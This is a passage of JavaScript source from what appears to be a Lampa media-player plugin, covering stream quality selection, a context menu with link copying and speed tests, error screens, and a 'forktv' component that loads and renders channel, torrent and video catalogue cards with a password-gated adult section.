      var convertedQuality = _self.convertQualityToFormat(quality);
      for (var i in convertedQuality) {
        var qualityData = convertedQuality[i];
        qual.push({
          title: i + '<sub>' + qualityData.label + '</sub>',
          file: qualityData.url || quality[i],
          reserve_quality: qualityReserve && qualityReserve[i] ? qualityReserve[i] : undefined
        });
      }
      return qual;
    };
    var showQualitySelector = function(title, qual, onSelectCallback, enabled, hasReserveQuality) {
      Lampa.Select.show({
        title: title,
        items: qual,
        onBack: function onBack() {
          Lampa.Controller.toggle(enabled);
        },
        onSelect: function onSelect(b) {
          if (!b.file) {
            return Lampa.Bell.push({
              text: Lampa.Lang.translate('copy_error')
            });
          }
          
          if (hasReserveQuality && b.reserve_quality) {
            var select_quality = function select_quality(b, call) {
              if (!b.reserve_quality || b.file === b.reserve_quality) {
                call({ file: b.file, title: b.title });
                return;
              }
              Lampa.Select.show({
                title: Lampa.Lang.translate('settings_server_links'),
                items: [
                  {
                    title: Lampa.Lang.translate('stream_number') + '1' + ' - ' + b.title,
                    file: b.file,
                    subtitle: Lampa.Utils.shortText(b.file, 35)
                  },
                  {
                    title: Lampa.Lang.translate('stream_number') + '2' + ' - ' + b.title,
                    file: b.reserve_quality,
                    subtitle: Lampa.Utils.shortText(b.reserve_quality, 35)
                  }
                ],
                onBack: function onBack() {
                  Lampa.Controller.toggle(enabled);
                },
                onSelect: function onSelect(b) {
                  call(b);
                }
              });
            };
            select_quality(b, function (b) {
              onSelectCallback(b);
            });
          } else {
            onSelectCallback(b);
          }
        }
      });
    };
    params.html.on('hover:long', function () {
      function show(extra) {
        var enabled = Lampa.Controller.enabled().name;
        var menu = [];
        if (Lampa.Platform.is('webos')) {
          menu.push({
            title: Lampa.Lang.translate('player_lauch') + ' - Webos',
            player: 'webos'
          });
        }
        if (Lampa.Platform.is('android')) {
          menu.push({
            title: Lampa.Lang.translate('player_lauch') + ' - Android',
            player: 'android'
          });
        }
        menu.push({
          title: Lampa.Lang.translate('player_lauch') + ' - Lampa',
          player: 'lampa'
        });
        menu.push({
          title: Lampa.Lang.translate('speedtest_button'),
          speed: true
        });
        menu.push({
          title: Lampa.Lang.translate('modss_video'),
          separator: true
        });
        menu.push({
          title: Lampa.Lang.translate('torrent_parser_label_title'),
          mark: true
        });
        menu.push({
          title: Lampa.Lang.translate('torrent_parser_label_cancel_title'),
          unmark: true
        });
        menu.push({
          title: Lampa.Lang.translate('time_reset'),
          timeclear: true
        });
        if (extra) {
          menu.push({
            title: Lampa.Lang.translate('copy_link'),
            copylink: true
          });
        }
        menu.push({
          title: Lampa.Lang.translate('more'),
          separator: true
        });
        if (Lampa.Account.logged() && params.element && typeof params.element.season !== 'undefined' && params.element.translate_voice) {
          menu.push({
            title: Lampa.Lang.translate('modss_voice_subscribe'),
            subscribe: true
          });
        }
        menu.push({
          title: Lampa.Lang.translate('modss_clear_all_marks'),
          clearallmark: true
        });
        menu.push({
          title: Lampa.Lang.translate('modss_clear_all_timecodes'),
          timeclearall: true
        });
        Lampa.Select.show({
          title: Lampa.Lang.translate('title_action'),
          items: menu,
          onBack: function onBack() {
            Lampa.Controller.toggle(enabled);
          },
          onSelect: function onSelect(a) {
            if (a.mark) params.element.mark();
            if (a.unmark) params.element.unmark();
            if (a.timeclear) params.element.timeclear();
            if (a.clearallmark) params.onClearAllMark();
            if (a.timeclearall) params.onClearAllTime();
            Lampa.Controller.toggle(enabled);
            if (a.player) {
              Lampa.Player.runas(a.player);
              params.html.trigger('hover:enter');
            }
            
            var copy_link = function copy_link(b) {
              Lampa.Utils.copyTextToClipboard(b.file, function () {
                Lampa.Bell.push({
                  text: Lampa.Lang.translate('copy_secuses')
                });
                Lampa.Controller.toggle(enabled);
              }, function () {
                Lampa.Bell.push({
                  text: Lampa.Lang.translate('copy_error')
                });
                Lampa.Controller.toggle(enabled);
              });
            }
            var speed = function speed(file, title) {
              var infoParts = [];
              if (params.element.season && params.element.episode) {
                infoParts.push('S' + params.element.season + ':E' + params.element.episode);
              }
              if (params.element.title && !params.element.season) {
                infoParts.push(params.element.title);
              }
              if (params.element.voice_name && params.element.season) {
                infoParts.push(params.element.voice_name);
              }
              var infoText = infoParts.length > 0 ? infoParts.join(' - ') : '';
              
              var balanserParts = [];
              if (title) {
                balanserParts.push('🚀 [' + title + ']');
              }
              if (params.element.serv) {
                balanserParts.push(params.element.serv);
              }
              if (['pub'].indexOf(balanser) >= 0) {
                if (params.element.info) {
                  var infoLast = params.element.info.split('●').pop();
                  if (infoLast) {
                    balanserParts.push(infoLast);
                  }
                }
              }
              balanserParts.push(sources[balanser].name);
              
              Modss.speedTest(file, {
                title: object.search,
                info: infoText,
                balanser: balanserParts.join('<br>')
              });
            }

            if (a.speed) {
              if (extra.quality && Lampa.Arrays.getKeys(extra.quality).length > 1) {
                var qual = buildQualityArray(extra.quality, extra.reserve_quality);
                var hasReserveQuality = extra.reserve_quality && Lampa.Arrays.getKeys(extra.reserve_quality).length;
                showQualitySelector(
                  Lampa.Lang.translate('player_quality'),
                  qual,
                  function(b) {
                    speed(b.file, b.title);
                  }, enabled, hasReserveQuality);
              } else speed(extra.file);
            }
            if (a.copylink) {
              if (extra.quality && Lampa.Arrays.getKeys(extra.quality).length > 1) {
                var qual = buildQualityArray(extra.quality, extra.reserve_quality);
                var hasReserveQuality = extra.reserve_quality && Lampa.Arrays.getKeys(extra.reserve_quality).length;
                showQualitySelector(
                  Lampa.Lang.translate('player_quality') + ' - ' + Lampa.Lang.translate('settings_server_links'),
                  qual,
                  function(b) {
                    copy_link(b);
                  }, enabled, hasReserveQuality);
              } else copy_link(extra);
            }
            if (a.subscribe) {
              Lampa.Account.subscribeToTranslation({
                card: object.movie,
                season: params.element.season,
                episode: params.element.translate_episode_end,
                voice: params.element.translate_voice
              }, function () {
                Lampa.Noty.show(Lampa.Lang.translate('modss_voice_success'));
              }, function () {
                Lampa.Noty.show(Lampa.Lang.translate('modss_voice_error'));
              });
            }
          }
        });
      }
      params.onFile(show);
    }).on('hover:focus', function () {
      if (Lampa.Helper) {
        Lampa.Helper.show('online_file', Lampa.Lang.translate('helper_online_file'), params.html);
        Modss.showTooltip();
      }
    });
  };
  this.empty = function (msg) {
    var html = Lampa.Template.get('modss_does_not_answer', {});
    html.find('.online-empty__buttons').remove();
    html.find('.online-empty__title').text(msg && msg.title ? msg.title : Lampa.Lang.translate('empty_title_two'));
    html.find('.online-empty__time').text(msg && msg.mes ? msg.mes : msg ? msg : Lampa.Lang.translate('empty_text'));
    scroll.clear();
    scroll.append(html);
    this.loading(false);
    setTimeout(function () {
      var balanser = files.render().find('.filter--sort');
      Navigator.focus(balanser[0]);
    }, 100);
  };
  this.noConnectToServer = function (er) {
    var html = Lampa.Template.get('modss_does_not_answer', {});
    html.find('.online-empty__buttons').remove();
    html.find('.online-empty__title').text(er && er.vip ? er.vip.title : Lampa.Lang.translate('title_error'));
    html.find('.online-empty__time').text(er && er.vip ? er.vip.msg : er.error ? er.message : er ? er : Lampa.Lang.translate('modss_does_not_answer_text'));
    scroll.clear();
    files.appendHead(html);
    this.loading(false);
    setTimeout(function () {
      var balanser = files.render().find('.filter--sort');
      Navigator.focus(balanser[0]);
    }, 100);
  };
  this.doesNotAnswer = function (query) {
    var _this8 = this;
    this.reset();
    var html = Lampa.Template.get('modss_does_not_answer', {
      title: (query && query.length) ? (Lampa.Lang.translate('online_query_start') + ' (' + query + ') ' + Lampa.Lang.translate('online_query_end') + Lampa.Lang.translate('modss_balanser_dont_work_from')) : Lampa.Lang.translate('modss_balanser_dont_work'),
      balanser: balanser
    });
    var tic = 10;
    html.find('.cancel').on('hover:enter', function () {
      clearInterval(balanser_timer);
    });
    html.find('.change').on('hover:enter', function () {
      clearInterval(balanser_timer);
      filter.render().find('.filter--sort').trigger('hover:enter');
    });
    scroll.clear();
    scroll.append(html);
    this.loading(false);
    Lampa.Controller.enable('content');
    balanser_timer = setInterval(function () {
      tic--;
      html.find('.timeout').text(tic);
      if (tic == 0) {
        clearInterval(balanser_timer);
        var keys = Lampa.Arrays.getKeys(sources);
        var indx = keys.indexOf(balanser);
        var next = keys[indx + 1];
        if (!next) next = keys[0];
        balanser = next;
        if (Lampa.Activity.active().activity == _this8.activity) _this8.changeBalanser(balanser);
      }
    }, 1000);
  };
  this.getLastEpisode = function (items) {
    var last_episode = 0;
    items.forEach(function (e) {
      if (typeof e.episode !== 'undefined') last_episode = Math.max(last_episode, parseInt(e.episode));
    });
    return last_episode;
  };
  this.start = function () {
    if (Lampa.Activity.active().activity !== this.activity) return;
    if (!initialized) {
      initialized = true;
      this.initialize();
    }
    Lampa.Background.immediately(Lampa.Utils.cardImgBackground(object.movie));
    Lampa.Controller.add('content', {
      toggle: function toggle() {
        Lampa.Controller.collectionSet(scroll.render(), files.render());
        Lampa.Controller.collectionFocus(last || false, scroll.render());
      },
      gone: function gone() {
        clearTimeout(balanser_timer);
      },
      up: function up() {
        if (Navigator.canmove('up')) {
          Navigator.move('up');
        } else Lampa.Controller.toggle('head');
      },
      down: function down() {
        Navigator.move('down');
      },
      right: function right() {
        if (Navigator.canmove('right')) Navigator.move('right');
        else {
          var ser = !!object.movie.name;
          if (ser && allItemsToDisplay.length > 100 && filterSelectItems.length) {
            var allEls = files.render().find('.online_modss--full.selector');
            var focusedEl = files.render().find('.online_modss--full.focus');
            var focusedIdx = focusedEl.length ? allEls.index(focusedEl) : -1;
            var scrollItem = filterSelectItems.filter(function (s) { return s.scrollTop; })[0];
            if (focusedIdx >= 19 && !scrollItem) {
              var resetIdx = filterSelectItems.indexOf(filterSelectItems.filter(function (s) { return s.reset; })[0]);
              if (resetIdx >= 0) {
                filterSelectItems.splice(resetIdx, 0, {
                  title: Lampa.Lang.translate('modss_scroll_to_start'),
                  scrollTop: true
                });
                filter.set('filter', filterSelectItems);
              }
            } else if (focusedIdx < 19 && scrollItem) {
              Lampa.Arrays.remove(filterSelectItems, scrollItem);
              filter.set('filter', filterSelectItems);
            }
          }
          if (object.movie.number_of_seasons) filter.show(Lampa.Lang.translate('title_filter'), 'filter');
          else filter.show(Lampa.Lang.translate('modss_balanser'), 'sort');
        }
      },
      left: function left() {
        var poster = files.render().find('.explorer-card__head-img');
        if (poster.hasClass('focus')) Lampa.Controller.toggle('menu');
        else if (Navigator.canmove('left')) Navigator.move('left');
        else files.toggle();//Navigator.focus(poster[0]);
      },
      back: this.back.bind(this)
    });
    Lampa.Controller.toggle('content');
  };
  this.render = function () {
    return files.render();
  };
  this.back = function () {
    if (back_url) {
      this.activity.loader(true);
      this.reset();
      this.request(back_url);
      back_url = false;
    } else Lampa.Activity.backward();
  };
  this.pause = function () { };
  this.stop = function () { };
  this.destroy = function () {
    network.clear();
    this.clearImages();
    files.destroy();
    scroll.destroy();
    clearInterval(balanser_timer);
    clearTimeout(number_of_requests_timer);
    clearTimeout(balancer_cache_empty_timer);
    balancer_cache_empty_retries = 0;
    clearTimeout(life_wait_timer);
    allItemsToDisplay = [];
    allRenderedItems = [];
    seasonGroups = [];
    
    // Очищаем новые переменные пагинации
    items_need_add = [];
    added = 0;
    shouldLoadToLastWatched = false;
    
    // Очищаем кеш источников
    sourcesCache = null;
    sourcesCacheTime = 0;
    sourcesData = null;
    filterSources = null;
    currentPlayItem = null;

    Lampa.PlayerPanel.listener.remove('visible', _self.handlePlaylistIcon);
    Lampa.PlayerPlaylist.listener.remove('select', _self.callLoadedInf);
    Lampa.PlayerPanel.listener.remove('flow', _self.changeQuality);
  };
}
	
  function forktv(object) {
  	var network = new Lampa.Reguest();
  	var scroll = new Lampa.Scroll({
  		mask: true,
  		over: true,
  		step: 250
  	});
  	var items = [];
  	var contextmenu_all = [];
  	var html = $('<div class="forktv"></div>');
  	var body = $('<div class="category-full"></div>');
  	var last;
  	var waitload = false;
  	var active = 0;
  	this.create = function () {
  		var _this = this;
  		this.activity.loader(true);
  		if (object.submenu) _this.build(object.url);
  		else {
  			var u = object.url && object.url.indexOf('?') > -1 ? '&' : '?';
  			network["native"](object.url + u + ForkTV.user_dev(), function (found) {
  				_this.build(found);
  			}, function (a, c) {
  				_this.build(a);
  				Lampa.Noty.show(network.errorDecode(a, c));
  			});
  		}
  		return this.render();
  	};
  	this.next = function (next_page_url) {
  		var _this2 = this;
  		if (waitload) return;
  		if (object.page < 90) {
  			waitload = true;
  			object.page++;
  			network["native"](next_page_url + '&' + ForkTV.user_dev(), function (result) {
  				_this2.append(result);
  				if (result.channels.length) waitload = false;
  				Lampa.Controller.enable('content');
  				_this2.activity.loader(false);
  			}, function (a, c) {
  				Lampa.Noty.show(network.errorDecode(a, c));
  			});
  		}
  	};
  	this.stream = function (data, title, youtube, subs, element, view) {
  		var _this = this;
  		if (data.indexOf('getstream') == -1 && (data.indexOf('rgfoot') > -1 || data.indexOf('torrstream') > -1 || data.indexOf('torrent') > -1)) {
  			this.activity.loader(true);
  			network.timeout(10000);
  			network["native"](data + '&' + ForkTV.user_dev(), function (json) {
  				_this.activity.loader(false);
  				if (json.channels.length > 0) {
  					var playlist = [];
  					var data = json.channels[0];
  					if (data.stream_url) {
  						var first = {
  							title: data.title,
  							url: data.stream_url,
  							timeline: view
  						};
  						if (json.channels.length > 1) {
  							json.channels.forEach(function (elem) {
  								playlist.push({
  									title: elem.title,
  									url: elem.stream_url
  								});
  							});
  						} else playlist.push(first);
  						if (playlist.length > 1) first.playlist = playlist;
  						Lampa.Player.play(first);
  						Lampa.Player.playlist(playlist);
  					} else Lampa.Noty.show(data.title);
  				} else Lampa.Noty.show(Lampa.Lang.translate('online_nolink'));
  			}, function (a, e) {
  				_this.activity.loader(false);
  				Lampa.Noty.show(network.errorDecode(a, e));
  			}, false, {
  				dataType: 'json'
  			});
  		} else if (data && data.match(/magnet|videos|stream\\?|mp4|mkv|m3u8/i)) {
  			if (object.title == 'IPTV') {
  				Lampa.Activity.push({
  					url: data + '?' + ForkTV.user_dev(),
  					title: "MODS's TV",
  					component: 'modss_tv',
  					page: 1
  				});
  			} else {
  				var subtitles = [];
  				if (subs) {
  					subs.forEach(function (e) {
  						subtitles.push({
  							label: e[0],
  							url: e[1]
  						});
  					});
  				}
  				var playlist = [];
  				var first = {
  					title: title,
  					url: data,
  					subtitles: subtitles,
  					timeline: view
  				};
  				if (element.length > 1) {
  					JSON.parse(element).forEach(function (elem) {
  						if (elem.title.match('Описание|Торрент|Трейлер|Страны|Жанр|Похож|Модел|Студи|Катег|Превь|Тег|Порноз') == null) playlist.push({
  							title: elem.title,
  							url: elem.stream_url
  						});
  					});
  				} else playlist.push(first);
  				if (playlist.length > 1) first.playlist = playlist;
  				Lampa.Player.play(first);
  				Lampa.Player.playlist(playlist);
  			}
  		} else if (youtube) {
  			var id = youtube.split('=')[1];
  			if (Lampa.Platform.is('android')) Lampa.Android.openYoutube(id);
  			else _this.YouTube(id);
  		}
  	};
  	this.append = function (data) {
  		var _this3 = this;
  		var viewed = Lampa.Storage.cache('online_view', 5000, []);
  		var bg_img = JSON.stringify(data).replace('background-image', 'background_image');
  		bg_img = JSON.parse(bg_img);
  		bg_img.background_image && Lampa.Background.immediately(bg_img.background_image);
  		if (data.channels && data.channels.length == 0) {
  			Lampa.Noty.show('Ничего не найдено');
  		} else {
  			var json = data.channels && data.menu && data.menu.length > 0 && data.menu[0].title != 'Трейлер' && data.next_page_url && data.next_page_url.indexOf('page=1') > -1 ? data.menu.concat(data.channels) : (object.title == 'SerialHD' && data.next_page_url && data.next_page_url.split('page=')[1] != 2) ? data.channels.slice(1) : data.channels;
  			json = JSON.stringify(json).replace('<br \/>', '<br>').replace(/\)|\(|%20/g, '');
  			if (data.title == 'HDGO') {
  					[{
  					name: 'Быстрый доступ',
  					id: [0, 1, 2, 3]
  					}, {
  					name: 'Фильмы',
  					id: [4, 14,15,16,17]
  					}, {
  					name: 'Сериалы',
  					id: [5, 18,19,20,21,22]
  					}, {
  					name: 'Мультфильмы',
  					id: [6, 23,24,25]
  					}, {
  					name: 'Мультсериалы',
  					id: [7, 26,27,28,29]
  					}, {
  					name: 'Аниме',
  					id: [8, 30,31,32,33]
  					}, {
  					name: 'Тв-Шоу',
  					id: [9, 34, 35,36]
  					}, {
  					name: 'Док. Сериалы',
  					id: [10, 37,38,39]
  					}, {
  					name: 'Док. Фильмы',
  					id: [11, 40,41]
  					}].map(function (i) {
  					_this3.appendHdgo({
  						title: i.name,
  						results: JSON.parse(json).filter(function (element, id) {
  							if (i.id.indexOf(id) > -1) return element;
  						})
  					});
  				});
  			} else {
  				var element = JSON.parse(json)[0];
  				var infos = element.description ? element.description : element.template;
  				var voic = infos && infos.match(/Озвучка:(.*?)<br/) || infos && infos.match(/Перевод:(.*?)(<br|Разм|Обн|Реж|Вр|Фор)/) || '';
  				if (element.template && element.template.indexOf('film.') > -1 || element.logo_30x30 && element.logo_30x30.match('mediafil') || element.logo_30x30 && element.logo_30x30.match('folder') && element.playlist_url && element.playlist_url.indexOf('torrstream?magnet') > -1) {
  					var image = element.before && element.before.indexOf('src') > -1 ? $('img', element.before).attr('src') : element.template && element.template.indexOf('src') > -1 ? $('img', element.template).attr('src') : element.description && element.description.indexOf('src') > -1 ? $('img', element.description).attr('src') : element.logo_30x30 && element.logo_30x30.indexOf('png') > -1 ? element.logo_30x30 : element.details && element.details.poster ? element.details.poster : './img/icons/film.svg';
  					object.movie = {
  						img: image,
  						title: object.title,
  						original_title: '',
  						id: 1
  					};
  					var files = new Lampa.Files(object);
  					files.append(scroll.render());
  					html.append(files.render());
  					html.find('.selector').unbind('hover:enter').on('hover:enter', function () {
  						if (element.description || element.template) Lampa.Modal.open({
  							title: element.title,
  							size: 'medium',
  							html: $(element.description ? $(element.description).attr('style', '') : element.template),
  							onBack: function onBack() {
  								Lampa.Modal.close();
  								Lampa.Controller.toggle('content');
  							}
  						});
  					});
  				}
  				JSON.parse(json).forEach(function (element) {
  					var stream = element.stream_url ? element.stream_url : element.playlist_url;
  					if (element.title.match('Описание|Трейлер') == null) {
  						if (element.template && element.template.indexOf('film.') > -1 || element.logo_30x30 && element.logo_30x30.match('mediafil') || element.logo_30x30 && element.logo_30x30.match('folder') && element.playlist_url && element.playlist_url.indexOf('torrstream?magnet') > -1) {
  							body.attr('class', '');
  							scroll.body().addClass('torrent-list');
  							element.quality = (voic && voic[0]) || '';
  							element.info = '';
  							if (element.logo_30x30 && element.logo_30x30.match(/folder|mediafil/) && stream && stream.match(/torrstream\\?magnet|getstream|kinomix/)) {
  								var des = $(element.template || element.description).text();
  								var vo = des.match(/Озвучка(.*?)Вид/) || des.match(/Перевод:(.*?)Разм/);
  								var vid = des.match(/Видео[:](.*?)[|]/) || des.match(/Видео[:](.*?)Длит/) || des.match(/Видео(.*?)$/);
  								var sed_per = des.match(/Раздают:(.*?)Качают:(.*?)(Обн|Кач|Длит)/) || des.match(/Раздают:(.*?)\\s[|]\\sКачают:(.*?)(Обн|Кач|Длит)/);
  								var size1 = des.match(/t\/s(.*?)Озв/) || des.match(/Размер:(.*?)Разд/) || $(element.template || element.description).find('.trt-size').text();
  								var sizes = size1 && size1[1] || $(element.template || element.description).find('.trt-size').text();
  								element.quality = '';
  								if (sed_per || vid || sizes || vo) element.info = (sed_per ? '<b style="color:green">&#8679;' + parseInt(sed_per[1]) + '</b><b style="color:red">&#8659;' + parseInt(sed_per[2]) + '</b> - ' : '') + (vo ? vo[1] + ' / ' : '') + (sizes && ' <b>' + sizes + '</b><br><hr>' || '') + (vid ? vid[0].replace(/Аудио|Звук/, ' | Аудио') : '');
  							}
  							var card = Lampa.Template.get('onlines_v1', element);
  							var hash = Lampa.Utils.hash([element.title, element.ident, stream].join(''));
  							var view = Lampa.Timeline.view(hash);
  							var hash_file = Lampa.Utils.hash([element.title, element.ident, stream].join(''));
  							element.timeline = view;
  							card.append(Lampa.Timeline.render(view));
  							if (Lampa.Timeline.details) card.find('.online__quality').append(Lampa.Timeline.details(view, ' / '));
  							if (viewed.indexOf(hash_file) !== -1) card.append('<div class="torrent-item__viewed">' + Lampa.Template.get('icon_star', {}, true) + '</div>');
  						} else {
  							var image = element.before && element.before.indexOf('src') > -1 ? $('img', element.before).attr('src') : element.template && element.template.indexOf('src') > -1 ? $('img', element.template).attr('src') : element.description && element.description.indexOf('src') > -1 ? $('img', element.description).attr('src') : element.logo_30x30 && element.logo_30x30.indexOf('png') > -1 ? element.logo_30x30 : element.details && element.details.poster ? element.details.poster : './img/icons/film.svg';
  							if (!element.search_on) {
  								var time = $($(element.description).children()[0]).parent().text();
  								time = time.match(/Продолжительность: (.*?)?./i);
  								time = time && time.shift() + ' - ' || '';
  								var descr = !element.ident && element.description && $($(element.description).children()[1]) ? $($(element.description).children()[1]).text().slice(0, 130) || $($(element.description).children()[0]).parent().text().slice(0, 130) : '';
  								var info = element.description ? element.description : element.template;
  								var voice = info && info.match(/Озвучка[:](.*?)(Субтит|<\/div><\/div>|<br)/) || info && info.match(/Перевод:(.*?)(<br|Разм|Обн|Реж|Вр|Фор)/) || '';
  								var size = info && info.match(/(Размер|Size):(.*?)<br/) || '';
  								var qual = info && info.match(/Качество:(.*?)<br/) || '';
  								var qual2 = qual ? qual[1].split(' ')[1] : voice ? voice[1] && voice[1].split('>')[2].trim().split(/,\\s|\\s/)[0] : '';
  								var rating = $(element.template).find('.a-r').text();
  								var peer = info && info.split(/<br[^>]*>|<\/div>/).find(function (itm) {
  									if (itm.match(/Качают|Скачивают|Leechers/)) return itm;
  								});
  								var seed = info && info.split(/<br[^>]*>|<\/div>/).find(function (itm) {
  									if (itm.match('Раздают|Seeders')) return itm;
  								});
  							}
  							var card = Lampa.Template.get('card', {
  								title: element.title || element.details && element.details.name,
  								release_year: (size && size[0] + ' | ') + voice && voice[1] ? (voice[1].indexOf(',') > -1 ? voice[1].split(',')[0] : voice[1]) : ''
  							});
  							if (rating) card.find('.card__view').append('<div class="card__type a-r' + (rating <= 5 ? ' b' : (rating >= 5 && rating <= 7) ? ' de' : ' g') + '" style="background-color: #ff9455;">' + rating + '</div>');
  							if (qual2) card.find('.card__view').append('<div class="card__quality">' + qual2 + '</div>');
  							if (seed) card.find('.card__view').append('<div class="card__type" style="background:none;font-size:1em;left:-.2em;top:-.5em"><b style="position:relative ;background: green;color: #fff;" class="card__type">' + parseInt(seed.match(/ \\d+/) ? seed.match(/ \\d+/)[0] : seed.match(/\\d+/)[0]) + '</b><b class="card__type" style="position:relative;background: #ff4242;color: #fff;left:-1em!important;border-bottom-left-radius: 0;border-top-left-radius: 0" class="info_peer">' + parseInt(peer.match(/ \\d+/) ? peer.match(/ \\d+/)[0] : peer.match(/\\d+/)[0]) + '</b></div>');
  							card.addClass(isNaN(element.ident) && (element.home || typeof element.details != 'undefined' || element.title == 'Все' || element.title.match(/Всі|Обновлен|жанры|сезон|Наше|Зарубеж|Женск|Муж|Отеч|Фил|Сериал|Мул|Худ/g) !== null || element.template && element.template.indexOf('svg') > -1 || element.logo_30x30 && element.logo_30x30.match(/ttv|right|succes|server|info|cloud|translate|error|trailer|uhd|webcam|mediafile|viewed|new|top|country|genre|similarmenu|filter/g) != null || stream && (stream.indexOf('browse') > -1 || stream.indexOf('viewforum') > -1 || stream.indexOf('me/list?actor=') > -1 || stream.indexOf('genre=') > -1) || element.playlist_url && element.playlist_url.indexOf('actor') == -1 && element.playlist_url && element.playlist_url.indexOf('voice?') == -1 && element.playlist_url && element.playlist_url.match(/cat=|page=|year=|list\\?direc|genre|list\\?actor|country/g) !== null || element.playlist_url && element.playlist_url.indexOf('view?id') == -1 && element.playlist_url && element.playlist_url.indexOf('stream?id') == -1 && element.playlist_url && element.playlist_url.indexOf('details?') == -1 && object.title.indexOf('HDGO') > -1 || element.logo_30x30 && element.logo_30x30.indexOf('webcam') > -1) ? 'card--collection' : 'card--category');
  							if (!data.landscape && !data.details && ((/iPhone|android/i.test(navigator.userAgent) || Lampa.Platform.is('android')))) card.addClass('mobile');
  							if (/iPhone|x11|nt/i.test(navigator.userAgent) && !Lampa.Platform.is('android')) card.addClass('pc');
  							if (/Mozilla/i.test(navigator.userAgent) && !/Android/i.test(navigator.userAgent) || Lampa.Platform.tv()) card.addClass('tv');
  							if (data.details && !data.details.images && stream && stream.match(/subcategory|submenu|page=|year=|list\\?direc|genre|list\\?actor|country/g) !== null) card.addClass('mobiles');
  							if (element.description && element.description.indexOf('linear-gradientto') > -1 || data.landscape || data.next_page_url && data.next_page_url.indexOf('girl') > -1) card.addClass('nuam');
  							if (data.next_page_url && data.next_page_url.indexOf('girl') > -1 && stream.indexOf('vporn/list?cat')) card.addClass('card--category').removeClass('card--collection');
  							if (element.logo_30x30 && element.logo_30x30.match(/country|genre|filter|mediafolder/g) != null) card.addClass('hdgo');
  							if (element.logo_30x30 && element.logo_30x30.match(/\/folder\./g) && stream.match(/stream|magnet|view\?|view=|\/details/g)) card.addClass('mobile card--category').removeClass('card--collection');
  							if (element.logo_30x30 && element.logo_30x30.indexOf('/folder.') > -1 && stream.match(/view=/g)) card.addClass('card--category hdgo').removeClass('card--collection nuam mobile');
  							if (element.logo_30x30 && element.logo_30x30.match(/mediafolder/g)) card.addClass('card--category').removeClass('card--collection');
  							if (bg_img.background_image && bg_img.background_image.indexOf('18') > -1 && ((data.next_page_url && data.next_page_url.indexOf('girl') > -1) && stream.match(/pornst|models/g) !== null)) card.addClass('card--category').removeClass('nuam hdgo mobile card--collection');
  							if (image && image.indexOf('film.svg') > -1) card.addClass('card--collection nuam');
  							if (bg_img.background_image && bg_img.background_image.indexOf('18') > -1 && stream.match(/view\\?|hdporn|channel=/g)) card.addClass('card--collection').removeClass('nuam hdgo mobile card--category');
  							if (object.title.match(/Торренты|ForkTV|18\\+/g)) card.addClass('home');
  							if (element.logo_30x30 && element.logo_30x30.match(/country|genre|filter/g)) card.addClass('sort');
  							if ((stream && stream.match(/filmix\\?subcategory|rutor/) || element.submenu && element.submenu[0] && element.submenu[0].playlist_url && element.submenu[0].playlist_url.indexOf('rutor') > -1) && element.logo_30x30 && element.logo_30x30.match(/filter/g)) card.addClass('two');
  							if (element.title == 'Поиск' && (stream && stream.match(/coldfilm/) || object.title == 'SerialHD')) card.addClass('searc');
  							var img = card.find('img')[0];
  							img.onload = function () {
  								card.addClass('card--loaded');
  							};
  							img.onerror = function (e) {
  								img.src = './img/img_broken.svg';
  							};
  							var picture = image && image.indexOf('yandex') > -1 ? 'https://cors.eu.org/' + image : image && image.indexOf('svg') > -1 ? image : image;
  							img.src = image;
  						}
  						//console.log ('class', card[0].className, window.innerWidth)
  						card.on('hover:focus hover:touch', function () {
  							if (this.className.indexOf('card--category') > -1) {
  								if (Lampa.Helper) Lampa.Helper.show('online_file', 'Удерживайте клавишу (ОК) для просмотра описания', card);
  								//Lampa.Background.immediately(image);
  							}
  							last = card[0];
  							scroll.update(card, true);
  							var maxrow = Math.ceil(items.length / 7) - 1;
  							if (Math.ceil(items.indexOf(card) / 7) >= maxrow)
  								if (data.next_page_url) _this3.next(data.next_page_url);
  						}).on('hover:enter', function () {
  							if (stream || data.channels.length > 0) {
  								if (element.event || (stream && stream.match(/youtube|stream\\?|mp4|mkv|m3u8/i))) {
  									_this3.stream(stream, element.title, element.infolink || element.stream_url, element.subtitles, json, view);
  									if (viewed.indexOf(hash_file) == -1) {
  										viewed.push(hash_file);
  										card.append('<div class="torrent-item__viewed">' + Lampa.Template.get('icon_star', {}, true) + '</div>');
  										Lampa.Storage.set('online_view', viewed);
  									}
  								} else if (element.search_on) {
  									Lampa.Input.edit({
  										value: element.playlist_url.indexOf('newserv') > -1 && Lampa.Storage.get('server_ip') ? Lampa.Storage.get('server_ip') : '',
  										free: true
  									}, function (new_value) {
  										if (new_value == '') {
  											Lampa.Controller.toggle('content');
  											return;
  										}
  										if (element.playlist_url.indexOf('newserv') > -1) Lampa.Storage.set('server_ip', new_value);
  										var query = element.playlist_url.indexOf('newserv') > -1 ? Lampa.Storage.get('server_ip') : new_value;
  										var u = element.playlist_url && element.playlist_url.indexOf('?') > -1 ? '&' : '/?';
  										network["native"](element.playlist_url + u + 'search=' + query + '&' + ForkTV.user_dev(), function (json) {
  											if (json.channels && json.channels[0].title.indexOf('по запросу') > -1) {
  												if (json.channels.length == 0) {
  													Lampa.Controller.toggle('content');
  													return;
  												}
  												Lampa.Modal.open({
  													title: '',
  													size: 'medium',
  													html: Lampa.Template.get('error', {
  														title: 'Ошибка',
  														text: json.channels[0].title
  													}),
  													onBack: function onBack() {
  														Lampa.Modal.close();
  														Lampa.Controller.toggle('content');
  													}
  												});
  											} else {
  												Lampa.Activity.push({
  													title: element.title,
  													url: json,
  													submenu: true,
  													component: 'forktv',
  													page: 1
  												});
  											}
  										});
  									});
  								} else if (stream == '' || image.indexOf('info.png') > -1) {
  									Lampa.Modal.open({
  										title: element.title,
  										size: 'medium',
  										html: $('<div style="font-size:4vw">' + $(element.description)[0].innerHTML + '</div>'),
  										onBack: function onBack() {
  											Lampa.Modal.close();
  											Lampa.Controller.toggle('content');
  										}
  									});
  								} else if (stream) {
  									var goto = function goto() {
  										var title = /*stream == 'submenu' ? element.submenu && element.submenu[0].title : */ element.details && element.details.title ? element.details.title : element.title && element.title.indexOf('l-count') > -1 ? element.title.split(' ').shift() : element.details && element.details.name ? element.details.name : element.title;
  										//console.log (element.submenu)
  										var url = stream == 'submenu' ? {
  											channels: element.submenu
  										} : stream;
  										Lampa.Activity.push({
  											title: title,
  											url: url,
  											submenu: stream == 'submenu',
  											component: 'forktv',
  											page: 1
  										});
  									};
  									if (element.title == '18+' && Lampa.Storage.get('mods_password')) {
  										Lampa.Input.edit({
  											value: "",
  											title: "Введите пароль доступа",
  											free: true,
  											nosave: true
  										}, function (t) {
  											if (Lampa.Storage.field('mods_password') == t) goto();
  											else {
